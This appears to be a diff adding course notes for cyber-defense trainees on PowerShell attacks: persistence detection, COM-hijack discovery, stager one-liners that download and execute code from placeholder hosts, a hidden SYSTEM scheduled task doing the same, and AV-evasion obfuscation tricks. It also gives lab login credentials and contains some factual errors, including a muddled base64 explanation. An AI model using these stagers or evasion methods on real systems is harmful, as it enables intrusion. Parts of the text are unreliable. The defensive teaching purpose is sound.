@@ -2832,3 +2832,313 @@ PS C:\Windows\system32> Clear-Content C:\Users\trainee\Documents\WindowsPowerShe
 
 ![image](https://github.com/user-attachments/assets/fc224701-a44b-4151-bd42-4ec2d4d3fecd)
 
+
+
+
+
+
+![image](https://github.com/user-attachments/assets/6cfcb158-46cc-4370-808f-e35ba408d34f)
+
+
+
+
+
+![image](https://github.com/user-attachments/assets/4c262336-4c25-4903-b800-73a8028bb327)
+
+
+
+Defense against Persistent Object Exploitation
+Detecting hijacked sessions and fileless malware can be tricky, but monitoring for the following events can help indicate and track a compromise:
+
+Unusual commands
+
+New profile files
+
+New process execution or creation
+
+﻿Unusual Commands﻿
+
+﻿
+
+Defenders may identify a compromise by monitoring abnormal PowerShell commands that sysadmins do not normally use. Most organizations have a set of approved methods for administration that they regularly use, so logs warrant investigation when they indicate commands that are rarely used.
+
+﻿
+
+﻿
+
+New Profile Files﻿
+
+﻿
+
+PowerShell profile locations should also be monitored for the creation of new files. PowerShell profiles are often edited, rather than newly created within a production environment. If Security Information and Event Management (SIEM) log alerts display new PowerShell profiles being created, this is a cause for concern for defenders.
+
+﻿
+
+New Process Execution or File Creation﻿
+
+﻿
+
+Good security practice for defenders also includes monitoring log alerts for new process or file creations. New process execution from PowerShell may indicate that adversaries have compromised that process, or that they're using a normal system process or application as part of their attack. Monitoring these types of logs are also useful to identify potential indicators of attack beyond PowerShell.
+
+
+ 
+![image](https://github.com/user-attachments/assets/4c262336-4c25-4903-b800-73a8028bb327)
+
+![image](https://github.com/user-attachments/assets/6cfcb158-46cc-4370-808f-e35ba408d34f)
+
+
+
+
+
+
+Finding Exploitable Objects
+Component Object Models (COM) and their relevant Class Identifiers (CLSID) represent any number of objects on a system. The exploit example in the following workflow implements registry key COMs and their linked CLSIDs. This workflow also uses a PowerShell module developed by security researcher David Tulis, called acCOMplice.
+
+﻿
+
+Investigating Vulnerable PowerShell Objects
+﻿
+
+Some applications will contain hard-coded references to DLLs that are not actually installed. This means that an attacker could place compromised DLLs where an application expects them, which the legitimate application may execute during normal operation. Use the COM Hijack Toolkit to investigate any potential objects that are vulnerable to this type of compromise.
+
+﻿
+
+Workflow
+﻿
+
+1. Log into the VM win-hunt with the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open PowerShell as an administrator.
+
+﻿
+
+3. Import the module acCOMplice into this session with the following command:
+
+PS C:\Windows\system32> Import-Module C:\Users\trainee\Documents\acCOMplice\COMHijackToolkit.ps1
+﻿
+
+4. Find all registry keys that have symbolic links to files that do not exist by entering the following command:
+
+###############PS C:\Windows\system32> Find-MissingLibraries########################
+
+
+
+![image](https://github.com/user-attachments/assets/a12eac07-b092-493e-9a34-2bcfb7ba2646)
+
+
+If an adversary was able to enumerate these keys, they could create malicious files with the found DLL names. The relevant registry keys would execute those malicious DLLs after running the relevant application's code. An adversary could then hide within an installed application using a file that is expected to exist. 
+
+
+Use the information from this workflow to answer the next question.
+
+
+
+
+
+
+PowerShell Launcher Steps
+Attackers use PowerShell stagers to hide the details of the final payload and to execute a larger payload in an environment that has command size limitations. For example, if an attacker schedules a task on a remote system, it is difficult to pass an entire malicious payload in the limited amount of characters allowed. It is possible to craft a command that reaches out over the network and executes a larger script. By having the command reach out, it also helps hide what is being executed by the malicious actor. The logging configuration may only catch the code that reaches out to execute more code.
+
+﻿
+
+Launcher/stager scripts are primarily designed to obtain data from the network and execute that data. If execution on this system is achieved by starting PowerShell, there are a few useful options that attackers pass to PowerShell.exe to help ensure their script runs.
+
+﻿
+
+Table 12.3-1 describes the common options that attackers use to execute PowerShell.
+
+ ![image](https://github.com/user-attachments/assets/1320161b-8b02-4e26-9227-2fed9cf647f4)
+
+Getting Data from the Network
+
+
+Most of the time the attacker wants the PowerShell launcher to call back to a server they are controlling. There are situations where making PowerShell listen on a port is useful, however, local firewalls typically prevent this type of connection so a listening launcher is not as useful. This section covers both ways to get data from a network into PowerShell.
+
+
+Outbound Connections
+
+
+Invoke-WebRequest or Invoke-RestMethod are the most common ways for PowerShell to pull data over the network. Invoke-RestMethod is better at dealing with JavaScript Object Notation (JSON) and eXtensible Markup Language (XML) data types, while Invoke-WebRequest is better at returning strings.
+$response=Invoke-WebRequest -uri "http://1.2.3.4/index.html"
+$data=$response.Content
+
+
+
+Another way to obtain data from the network is to call the .NET object directly with the following command:
+$data=(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
+
+
+
+Inbound Connections
+
+
+PowerShell is built on the .NET framework, so anything C# can do, PowerShell can do. This means there are many ways to have a system listen for inbound connections in PowerShell. The most common way to listen is to make a webserver.
+# Http Server
+$http = New-Object System.Net.HttpListener
+
+# Hostname and port to listen on
+$http.Prefixes.Add("http://127.0.0.1:8080/")
+
+# Start the Http Server 
+$http.Start()
+
+#This will block until there is a connection
+$context = $http.GetContext()
+
+$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
+[string]$html = "<h1>A PowerShell Webserver</h1>" 
+$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
+$context.Response.ContentLength64 = $buffer.Length
+$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
+
+#Shutdown gracefully
+$context.Response.OutputStream.Close()
+$http.Stop()
+
+
+
+Executing Data 
+
+
+The second step for a launcher to perform is to execute the code. Launchers use the command Invoke-Expression to execute text. This allows PowerShell to get a block of text, and execute it as commands.
+$Command = "get-process"
+
+Invoke-Expression $Command
+#or
+$Command | Invoke-Expression
+
+
+
+Examples
+
+
+When the -Command option is used with PowerShell.exe there is a limitation. The command cannot use variables the same way they are used in a terminal prompt. Commands can be modified to not use variables as an intermediary.
+PowerShell.exe -ExecutionPolicy bypass -Command "Invoke-Expression  (Invoke-WebRequest -uri http://199.63.64.31/index.html).content"
+
+
+
+The above example uses PowerShell to retrieve code from a remote location via Hypertext Transmission Protocol (HTTP) and execute the code content. Instead of executing it from the command line, the Scheduled Task (Schtask) command is used to create a scheduled job that automatically executes the PowerShell command at a given interval. The following example creates a scheduled job that downloads code and executes it with PowerShell.
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://1.2.3.4/'''))'" /sc onlogon /ru System
+
+
+
+Obfuscation Techniques
+Post-exploitation PowerShell scripts use a variety of obfuscation techniques to hide their functionality from users and bypass the Windows Anti-Malware Scan Interface (AMSI) or other antivirus technologies. Defenders need to recognize common obfuscation techniques like encoding in order to apply proper decoding techniques. The ability to adequately identify and utilize obfuscation techniques can help Cyber Defense Analysts (CDA) to replicate or understand attacker activities.
+
+﻿
+
+Base64
+﻿
+
+Base64 encoding is commonly used to represent binary data in text form and is a common obfuscation technique that defense analysts must be familiar with. The numbering system is base 10, meaning that each digit represents 10 different things with 10 characters (0..9) to use. In base64, a number is encoded with uppercase and lowercase letters, the 0–9 digits as well as the + and / signs. The = sign is used to pad the number since a base64-encoded string needs to be a multiple of 3. Meaning that if there was a four-character-long base64 string, it requires two = signs afterward to make it an even multiple of 3.
+
+﻿
+
+With PowerShell scripts, there are two options for executing a base64-encoded command. The script receives a base64-encoded string to execute and decodes the string before sending it to Invoke-Expression, or the PowerShell process is kicked off and told to execute a base64-encoded command. PowerShell has this feature because sometimes it is difficult to escape special characters, so PowerShell accepts and executes a base64 command directly.
+
+﻿
+
+##############Manipulating Base64 Strings###############
+﻿
+
+The following PowerShell code demonstrates the process for taking a string and converting it to the base64 equivalent, followed by the function to decode the base64 back into a plaintext string.
+
+#Convert to a base64 string
+$Text = 'get-process'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+
+#$Encoded Text is: ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA==
+
+#Decode
+$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
+﻿
+
+Executing a Base64 String Directly
+﻿
+
+Instead of converting base64 code to a string for execution, the base64 value can be passed directly to PowerShell for execution. The following example demonstrates that method.
+
+powershell.exe -encodedCommand "ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA=="
+﻿
+
+
+
+Case Sensitivity
+﻿
+
+Windows is famously case-insensitive. It is possible to change directories to c:\windows or c:\wINdoWs and get the same result. This type of obfuscation is commonly seen in attacks, though it is not as effective as other methods.
+
+﻿
+
+An attacker can change their PowerShell script to take advantage of this case insensitivity. These two commands execute the exact same way:
+
+Invoke-WebRequest -uri 'http://1.2.3.4/'
+or
+
+inVoKE-weBReQuESt -uRi 'http://1.2.3.4/'
+﻿
+
+Random Spaces
+﻿
+
+PowerShell does not recognize spaces between the commands, but they may matter to the defenders. Attackers include multiple spaces that are ignored by PowerShell but are aimed at adding obfuscation to the command execution so cyber defense tools are less likely to detect their execution.﻿
+
+inVoKE-weBReQuESt     -uRi  'http://1.2.3.4/'
+﻿
+
+String Concatenation
+﻿
+
+PowerShell adds strings together, giving an attacker another option to obfuscate the command and avoid detection. If a defender suspects an HTTP Uniform Resource Locator (URL) is used by the attacker, they might conduct log searches using the value http://, but that search does not match the concatenation of characters in the following command:
+
+Invoke-WebRequest -uri 'htt' + 'p' + ':/' + '/1.2.3.4/'
+﻿
+
+Internet Protocol Addresses as a Base10 Number
+﻿
+
+Internet Protocol version 4 (IPv4) addresses are commonly shown as a set of four octet numbers between 0.0.0.0 and 255.255.255.255. In reality, this is just a human-readable way of representing an integer number between 0 and 4.2 billion. Instead of using the common IPv4 address format, attackers replace the address with the integer equivalent value, making it less noticeable to a defender looking for IPv4 addresses. Attackers use either the decimal representation of the integer, or the hexadecimal format. Each octet of the address is an 8-bit number, and the four together form the 32-bit address. PowerShell can handle multiple formats, giving an attacker the option to connect using a normal IPv4 address, a base10 integer Internet Protocol (IP) address, or a base16 (hex) IP address.  The following example shows PowerShell's ability to convert the address formats, first from standard address to a base10 value, then to base16 value, then back to the standard address.
+
+([ipaddress]"1.2.3.4").Address
+67305985
+
+(67305985).tostring('x8')
+04030201
+
+([ipaddress]0x04030201).ipaddresstostring
+1.2.3.4
+﻿
+
+Converting an IP address to a number and back works without issue. However, PowerShell uses host ordering (little-endian) to store the integer value, which is verified above by converting the decimal number to hex. Using that integer as a replacement for the IP address does not work unless it is converted to network ordering (big-endian). This is manually done by reversing the order of the four bytes that make up the hex value and displaying the corresponding base10 value from that. In the example below, converting 1.2.3.4 makes the decimal version corresponding to 4.3.2.1. Simply entering the IP backward and generating the integer for that reversed IP address fixes the problem and provides the correct integer value that can be used to replace the address.
+
+([ipaddress]"1.2.3.4").Address
+67305985
+
+ping 67305985
+Pinging 4.3.2.1 with 32 bytes of data:
+
+([ipaddress]"4.3.2.1").Address
+16909060
+
+ping 16909060
+Pinging 1.2.3.4 with 32 bytes of data:
+﻿+
+
+
+
+
+
+ PowerShell Aliases
+PowerShell has the ability to create aliases for other commands. Some standard commands are actually aliases. For example, the command cd is an alias for the real command being executed, Set-Location. There is even an alias for setting aliases, sal. The alias for Invoke-WebRequest is iwr. For a full list of current aliases, use the command get-aliases.
+
+﻿
+
+Existing aliases are used to shorten up a malicious PowerShell command or to make the commands being executed appear benign.
+
+sal block-website iwr
+block-website -uri http://1.2.3.4
